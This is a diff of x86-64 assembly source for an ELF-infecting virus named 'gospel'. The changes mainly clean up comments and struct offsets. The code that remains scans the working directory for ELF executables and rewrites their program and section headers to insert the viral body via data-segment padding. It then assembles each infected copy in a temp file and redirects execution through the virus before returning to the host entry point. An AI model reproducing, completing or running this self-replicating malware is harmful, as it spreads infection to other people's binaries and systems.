@@ -238,8 +238,9 @@ section	.bss
 ; r14 + 60			.st_pad2		resd	1	;padding
 ; r14 + 68			.st_blocks		resq	1	;#of512bblocksallocated
 ; r14 + 76			.st_atime		resq	1	;timeoflastfileaccess
-; r14 + 		.st_mtime		resq	1	;timeoflastfilemod
-; r14 + 		.st_ctime		resq	1	;timeoflastfilestatuschange
+; r14 + 84			.st_mtime		resq	1	;timeoflastfilemod
+; r14 + 92			.st_ctime		resq	1	;timeoflastfilestatuschange
+; ...
 ; r14 + 144 end struc
 ;
 ; instructions for returning to original host ELF entry point
@@ -285,7 +286,9 @@ section	.bss
 ; r14 + 858			.e_shentsize	resb	2		;uint16_t, bytes 58-59
 ; r14 + 860			.e_shnum		resb	2		;uint16_t, bytes 60-61
 ; r14 + 862			.e_shstrndx		resb	2		;uint16_t, bytes 62-63
-; r14 + 865		endstruc
+; r14 + 864		endstruc
+;
+;
 ;
 ;
 
@@ -310,15 +313,6 @@ SYS_CREAT		equ 0x55
 
 
 PAGESIZE dd 4096	
-
-
-;teststr db 'boo', 13,10,0
-;teststrlen equ $-teststr
-
-;vxname: db 'gospel'
-
-;targetdir db '.',0
-;targetdirlen equ $-targetdir
 
 
 ;****************************************************************************************
@@ -369,7 +363,6 @@ PAGESIZE dd 4096
 ;****************************************************************************************
 
 ;variables used for phdr and shdr manipulation routines
-
 evaddr: dq 0
 
 ;original section header offset
@@ -377,16 +370,10 @@ oshoff: dd 0
 
 hostentry_offset: dd 0
 hosttext_start: dd 0
-;host_shdrs_len: dd 0
 
 data_offset_new_padding: dd 0
 data_offset_original: dd 0
 data_offset_padding_size: dd 0
-
-;DATA_OFFSET_HOST equ data_offset_original
-;DATA_OFFSET_HOST: dq 0
-;SHDR_OFFSET_HOST: dq 0
-;padding2data_segment equ	data_offset_new_padding-data_offset_original
 
 vxhostentry: dq 0
 vxoffset: dd 0
@@ -396,13 +383,6 @@ ventry equ $_start
 
 fd:	dq 0
 
-
-;fdlen equ $-fd
-;framebuffer:
-;	db `//dev//fb0`,0
-;framebuflen equ $-framebuffer
-;;
-
 STDOUT			equ 0x1
 
 ;open() syscall parameter reference 
@@ -411,14 +391,8 @@ O_WRONLY		equ 0x1
 O_RDONLY		equ 0x0
 
 
-;O_CREAT			equ 100o
-;O_TRUNC			equ 1000o
-;O_APPEND		equ 2000o
-
-;SEEK_CUR 		equ 0x1
-
-;S_IFREG    		dq 0x0100000   ;regular file
-;S_IFMT 			dq 0x0170000
+;S_IFREG    	dq 0x0100000   ;regular file
+;S_IFMT 		dq 0x0170000
 
 ;mode 		dd 0
 ;S_ISREG		equ (mode & S_IFMT)
@@ -469,7 +443,6 @@ _getdirents:
 ;rdx == mode
 ;; returns: fd (in rax, obv)
 ;****************************************************************************************
-	;mov rdi, targetdir
 	pop rdi
 	xor rsi, rsi 		;no flags
 	add rsi, 0x02000000
@@ -497,8 +470,7 @@ get_cwd:
 ;****************************************************************************************
 process_dirents:
 	mov rdi, rax
-	;lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
-	lea rsi, [r14 + 600] ;r14 + 600 is location on the stack where we'll save our dirent struct
+	lea rsi, [r14 + 600] 	;r14 + 600 = location on stack where we'll save our dirent struct
 	mov rdx, MAX_RDENT_BUF_SIZE
 	mov rax, SYS_GETDENTS64
 	syscall
@@ -590,18 +562,13 @@ check_file:
 		
 		xor r12, r12
 		lea rdi, [r14 + 200] 
-		;lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
-		lea rsi, [rcx + r14 + 618]
+		lea rsi, [rcx + r14 + 618]		;linuxdirent.d_nameq
 		.copy_filename:
 			movsb
 			inc r12
 			cmp byte [rsi], 0x0
 			jne .copy_filename
 		
-		;debug print check
-		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
-		;lea r13, [r14 + 200]
-		;call _write
 		xor rax, rax
 		push r9
 	check_filename:
@@ -610,9 +577,6 @@ check_file:
 		jmp get_vx_name
 	check_vx_name:
 		pop rsi
-		;lea rsi, [rax]
-		;mov rsi, vxname
-		;mov rsi, [rax]
 		lea rdi, [r14 + 200]
 		xor rcx, rcx
 		cld
@@ -632,36 +596,17 @@ check_file:
 		vxname: db "gospel"		
 
 	get_filestat:
-		;lea r13, filenamepass
-		;mov r12, filenamepasslen
-		;call _write
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
-		;lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
-		lea rsi, [r14]	;or retrieve size from filestat struct with an fstat syscall
+		lea rsi, [r14]				;or retrieve size from filestat struct with an fstat syscall
 		mov rdi, r8
 		mov rax, SYS_FSTAT
 		syscall
-
-		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
-		; since this is so annoying, I'm skipping this check for rn
-		;mov r10, [r14 + file_stat.st_mode]
-		;mov [mode], r10
-		;mov r10, S_ISREG(r10)
-		;cmp S_ISREG, S_IFREG	
-		;cmp r10, 0x1
-		;mov rax, [r14+file_stat.st_mode]
-		;and r10, [S_IFMT]
-		;mov r9, [S_IFREG]
-		;cmp r10, r9
-		;jne checknext
-	
 
 	
 		;void *mmap(void addr[.length], size_t length, int prot, int flags,
 		;                  int fd, off_t offset);
 	mmap_file:
 		xor rdi, rdi			;set RDI to NULL
-		;mov rsi, [r14 + filestat.st_size]
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
 		mov r10, MAP_PRIVATE
@@ -687,9 +632,9 @@ check_file:
 		test rax, rax
 		js checknext
 	check_elf_header_etype:
-		cmp word [rax + elf_ehdr.e_type], 0x0002
+		cmp word [rax + 16], 0x0002		;elf_ehdr.e_type
 		je check_elf_header_magic_bytes
-		cmp word [rax + elf_ehdr.e_type], 0x0003
+		cmp word [rax + 16], 0x0003		;elf_ehdr.e_type
 		je check_elf_header_magic_bytes
 		jnz checknext
 
@@ -888,10 +833,8 @@ infect:
 			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				;cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_X)
 				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RX
 				je .mod_phdr_text_segment			
-				;cmp dword [r13 + r12 + elf_phdr.p_flags], (PFLAG_R | PFLAG_W)
 				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
 				je .mod_phdr_data_segment			
 				jne .mod_subsequent_phdr
@@ -916,8 +859,6 @@ infect:
 				.mod_phdr_data_segment:			
 					mov r11, [r13 + r12 + elf_phdr.p_offset]
 					mov dword [data_offset_original],  r11d
-					;lea qword r10, [r13 + r12 + elf_phdr.p_offset]
-					;mov qword [DATA_OFFSET_HOST], r10
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 					mov dword [data_offset_new_padding],  r11d
@@ -929,11 +870,6 @@ infect:
 					mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 			.mod_subsequent_phdr:
-				;mov rdx, checkptloadfaillen
-				;lea rsi, checkptloadfail
-				;mov rdi, STDOUT
-				;mov rax, SYS_WRITE
-				;syscall
 				xor r11, r11
 				mov r11, [r13 + r12 + elf_phdr.p_offset]
 				cmp dword r11d, vxoffset
@@ -946,7 +882,7 @@ infect:
 			cmp cx, 0
 			jg .phdr_loop
 	mov dword [hostentry_offset], r12d
-	;jmp frankenstein_elf
+
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
 ;****************************************************************************************
@@ -976,9 +912,6 @@ infect:
 			add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_shentsize to shdr offset in r15 
 			cmp cx, 0
 			jg .shdr_loop
-	;mov dword [host_shdrs_len], r15d
-	;lea r10, [r13 + elf_ehdr.e_shoff]
-	;mov [SHDR_OFFSET_HOST], r10
 	mov r11, [r13 + elf_ehdr.e_shoff]
 	mov dword [oshoff], r11d
 	cmp dword r11d, [vxoffset]
@@ -1035,7 +968,7 @@ frankenstein_elf:
 	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
 	mov [r14 + 0x800], rax
 	lea rdi, [r14 + 0x800]			;name of file in rdi
-	mov rsi, 0777o					;mode - 755 (file perms for new file)
+	mov rsi, 0755o					;mode - 755 (file perms for new file)
 									;(O_CREAT | O_TRUNC | O_WRONLY)
 	mov rax, SYS_CREAT
 	syscall
@@ -1060,7 +993,6 @@ frankenstein_elf:
 		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
-;		jmp .write_datasegment_totemp
 	.write_virus_totemp:
 		mov rdi, r9
 		mov rdx, vlen
@@ -1089,8 +1021,6 @@ frankenstein_elf:
 		mov esi, dword [data_offset_new_padding]
 		mov rax, SYS_FTRUNCATE
 		syscall
-;		jmp .close_temp		
-		
 
 	.write_datasegment_totemp:
 		mov rdx, [oshoff]
@@ -1100,10 +1030,8 @@ frankenstein_elf:
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
-;		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
-		;mov rdx, [r14 + filestat.st_size]
 		mov rdx, [r14 + 48] 	;filestat.st_size
 		sub edx, dword [oshoff]
 		lea rsi, [r13 + elf_ehdr]
@@ -1111,12 +1039,10 @@ frankenstein_elf:
 		mov r10d, dword [vxshoff]
 		mov rax, SYS_PWRITE64
 		syscall
-;		jmp .close_temp		
 
 		
 		;munmap file from work area
 		mov rdi, r13
-		;mov rsi, [r14 + filestat.st_size]
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rax, SYS_MUNMAP
 		syscall
@@ -1145,5 +1071,3 @@ _end:
 	syscall	
 
 vlen equ $-_start
-
-
